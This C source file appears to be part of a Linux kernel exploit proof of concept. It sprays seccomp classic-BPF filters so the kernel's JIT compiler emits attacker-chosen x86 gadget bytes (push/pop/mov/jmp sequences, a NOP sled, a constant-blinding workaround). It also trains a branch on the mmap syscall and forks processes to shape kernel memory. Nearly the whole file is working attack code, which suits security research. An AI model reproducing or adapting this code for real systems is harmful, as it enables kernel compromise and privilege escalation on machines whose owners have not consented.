

#define _GNU_SOURCE

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <assert.h>
#include <stddef.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <syscall.h>
#include <pthread.h>

#include "targets.h"
#include "common.h"

#define VICTIM_SYSCALL SYS_mmap 

#define LO_ARG(idx) offsetof(struct seccomp_data, args[(idx)])
#define HI_ARG(idx) offsetof(struct seccomp_data, args[(idx)]) + sizeof(__u32)

#define BPF_2_BYTES ((struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, 1))
#define BPF_3_BYTES ((struct sock_filter) BPF_STMT(BPF_ST, 0))
#define BPF_4_BYTES ((struct sock_filter) BPF_STMT(BPF_STX, 0))
#define BPF_5_BYTES ((struct sock_filter) BPF_STMT(BPF_ALU+BPF_LSH+BPF_X, 0))

#define BPF_CB_16_BYTES ((struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x1010))
#define BPF_CB_21_BYTES ((struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW))


#define syscall_nr (offsetof(struct seccomp_data, nr))

struct sock_filter page_size_filter[BPF_MAXINSNS] = {0};

struct sock_fprog page_size_prog = {
    .filter = page_size_filter,
    .len = 0,
};

struct sock_filter replacement[BPF_MAXINSNS] = {0};
struct sock_fprog double_page_size_prog = {
    .filter = replacement,
    .len = 0,
};

struct sock_filter train_filter[BPF_MAXINSNS] = {0};

struct sock_fprog train_prog = {
    .filter = train_filter,
    .len = 0,
};


void initialize_page_size_filter(){

    int cursor = 0;

    
    page_size_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    page_size_filter[cursor++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xdead, 1, 0);
    page_size_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    for (size_t i = 0; i < 440; i++)
    {
        
        
	    page_size_filter[cursor++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0xdead, 0, 0);
    }

    page_size_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(cursor < 4096);

    page_size_prog.filter = page_size_filter;
    page_size_prog.len = cursor;

    printf("Total number of BPF instructions for page_size filter: %d\n", page_size_prog.len);

}

void initialize_target_chunk_constant_blind() {

    int n_bytes = 0;
    int cursor = 0;
    int iterations;


    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);
    replacement[cursor++] = BPF_2_BYTES;

#define DELTA_NOP_SLED 300
    int slot_nop_sled = cursor + 1;
    
    for (size_t i = 0; i < 25; i++) {
        
        
        
        
        replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_NOP_SLED); 
    }

    
#define DELTA_PUSH_RDI 75
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_PUSH_RDI); 
    int slot_push_rdi = cursor;

    
#define DELTA_POP_RAX 76
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_POP_RAX); 
    int slot_pop_rax = cursor;

#define DELTA_ADD_RAX 832
    
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_ADD_RAX); 
    int slot_add_rax = cursor;

    
#define DELTA_MOV_RAX 1750
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_MOV_RAX); 
    int slot_mov_rax = cursor;

    
#define DELTA_PUSH_RAX 172
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_PUSH_RAX); 
    int slot_push_rax1 = cursor;

    
#define DELTA_PUSH_RAX2 172
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_PUSH_RAX2); 
    int slot_push_rax2 = cursor;

    
#define DELTA_POP_RDX 174
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_POP_RDX); 
    int slot_pop_rdx = cursor;

    
#define DELTA_POP_RDI 175
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_POP_RDI); 
    int slot_pop_rdi = cursor;

    
    
#define DELTA_JMP_RAX 447
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_JMP | BPF_JA, DELTA_JMP_RAX); 
    int slot_jmp_rax = cursor;

    
    
    for (size_t i = 0; i < 20; i++)
    {
        replacement[cursor++] = BPF_5_BYTES;
    }

    for (size_t i = 0; i < 1740; i++)
    {
        replacement[cursor++] = BPF_CB_21_BYTES;
    }

    for (size_t i = slot_nop_sled; i < slot_nop_sled + 25; i++)
    {
        replacement[DELTA_NOP_SLED+ i] = BPF_5_BYTES;
    }


    
    replacement[slot_push_rdi + DELTA_PUSH_RDI - 1] = BPF_5_BYTES;

    
    assert(DELTA_PUSH_RDI <= DELTA_POP_RAX - 1);
    replacement[slot_pop_rax + DELTA_POP_RAX - 2] = BPF_3_BYTES;
    replacement[slot_pop_rax + DELTA_POP_RAX - 1] = BPF_3_BYTES;

    
    replacement[slot_nop_sled + DELTA_NOP_SLED-1] = BPF_5_BYTES;

    
    replacement[slot_push_rax1 + DELTA_PUSH_RAX-2] = BPF_CB_16_BYTES;
    replacement[slot_push_rax1 + DELTA_PUSH_RAX-1] = BPF_2_BYTES;

    replacement[slot_push_rax2 + DELTA_PUSH_RAX2-1] = BPF_5_BYTES;

    
    replacement[slot_pop_rdx + DELTA_POP_RDX-3] = BPF_5_BYTES;
    replacement[slot_pop_rdx + DELTA_POP_RDX-2] = BPF_5_BYTES;
    replacement[slot_pop_rdx + DELTA_POP_RDX-1] = BPF_5_BYTES;

    
    replacement[slot_pop_rdi + DELTA_POP_RDI-2] = BPF_5_BYTES;
    replacement[slot_pop_rdi + DELTA_POP_RDI-1] = BPF_5_BYTES;

    
    replacement[slot_add_rax + DELTA_ADD_RAX-3] = BPF_5_BYTES;
    replacement[slot_add_rax + DELTA_ADD_RAX-2] = BPF_5_BYTES;
    replacement[slot_add_rax + DELTA_ADD_RAX-1] = BPF_3_BYTES;


    
    replacement[slot_mov_rax + DELTA_MOV_RAX-2] = BPF_CB_16_BYTES;
    replacement[slot_mov_rax + DELTA_MOV_RAX-1] = BPF_2_BYTES;

    
    replacement[slot_jmp_rax + DELTA_JMP_RAX-2] = BPF_5_BYTES;
    replacement[slot_jmp_rax + DELTA_JMP_RAX-1] = BPF_5_BYTES;


    
    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);


    assert(cursor <= 4096);

    double_page_size_prog.filter = replacement;
    double_page_size_prog.len = cursor;
}


void initialize_target_chunk() {
    int cursor = 0;

    
    
    
    

    for (size_t i = 0; i < 20; i++)
    {
        
        replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0x2063ff90);
    }


    replacement[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(cursor < 4096);

    double_page_size_prog.filter = replacement;
    double_page_size_prog.len = cursor;

}

void initialize_replacement(uint8_t constant_blind_safe){


    if (constant_blind_safe) {
        initialize_target_chunk_constant_blind();
    } else {
        initialize_target_chunk();
    }

    printf("Total number of BPF instructions for target chunk: %d\n", double_page_size_prog.len);

}












void insert_training_branch(uint64_t branch_offset, uint64_t target_offset) {

    
    

    int n_bytes = 0;
    int cursor = 0;
    int iterations;

    
    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    
    train_filter[cursor++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, 1, 0);
    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    n_bytes += 40;

    
    


    iterations = 33;
    
    for (size_t i = iterations; i > 0; i--)
    {
        
        train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }


    
    
    int train_branch_idx = cursor++;

    

    
    
    iterations = 41 ;
    
    for (size_t i = iterations; i > 0; i--)
    {
        
        train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }
    
    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0xbeef);
    n_bytes += 5;


    int jump_length = cursor - train_branch_idx - 1; 
    train_filter[train_branch_idx] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, iterations, jump_length);

    
    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0xcafebabe);


    
    for (size_t i = 0; i < 10; i++)
    {
        
        train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x10101010);
        n_bytes += 6;
    }

    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    
    for (size_t i = 0; i < 600; i++)
    {
        
        train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x20202020);
        n_bytes += 6;
    }

    train_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(cursor < 4096);

    train_prog.filter = train_filter;
    train_prog.len = cursor;

    

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &train_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

}


void insert_allow_all_prog() {

    
    

    int n_bytes = 0;
    int cursor = 0;
    int iterations;

    struct sock_filter cur_filter[BPF_MAXINSNS] = {0};
    struct sock_fprog cur_prog = {0};

    cur_filter[cursor++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    cur_prog.filter = cur_filter;
    cur_prog.len = cursor;

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &cur_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

}


void insert_page_size_prog() {

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }
}

void insert_double_page_size_prog() {

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &double_page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }
}



void fork_insert_program_2MB() {


    
    pid_t p;

    for (size_t i = 0; i < 512 / 64; i++)
    {
        
        p = fork();
        if (p < 0) {
            perror("fork fail");
            exit(1);
        } else if (p > 0) {
            usleep(1000 * 100);
            continue;
        } else {
            
            break;
        }

    }

     if (p > 0) {
        usleep(1000 * 100);
        
        return;
    }

    

    for (int i = 0; i < 64; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }


    while (1)
    {
        sleep(100);
    }

}


void fork_insert_allow_all_prog(int n) {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        
        return;
    }

    for (size_t i = 0; i < n; i++)
    {
        insert_allow_all_prog();
    }

    while (1)
    {
        sleep(100);
    }

}


void fork_insert_program_4K() {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        
        return;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }


    while (1)
    {
        sleep(100);
    }

}


void fork_insert_program_2K() {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        
        return;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &double_page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

    while (1)
    {
        sleep(100);
    }

}



void fork_insert_program_n_pages(uint64_t n_pages) {

    assert(n_pages <= 64);

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        
        return;
    }

    

    for (int i = 0; i < n_pages; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }

    while (1)
    {
        sleep(100);
    }

}


void fork_reserve_n_bytes(uint64_t bytes) {

    uint64_t n_pages = 0;

    assert(bytes % 4096 == 0);


    while (bytes > (64 * 4096))
    {
        fork_insert_program_n_pages(64);
        bytes -= (64 * 4096);
        n_pages += 64;
    }

    fork_insert_program_n_pages(bytes / 4096);
    n_pages += bytes / 4096;

    printf("[+] Reserved in total %lu pages\n", n_pages);

}

void initialize_cbpf(uint8_t constant_blind_safe) {

	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)");
        exit(1);
	}

    initialize_page_size_filter();
    initialize_replacement(constant_blind_safe);

}
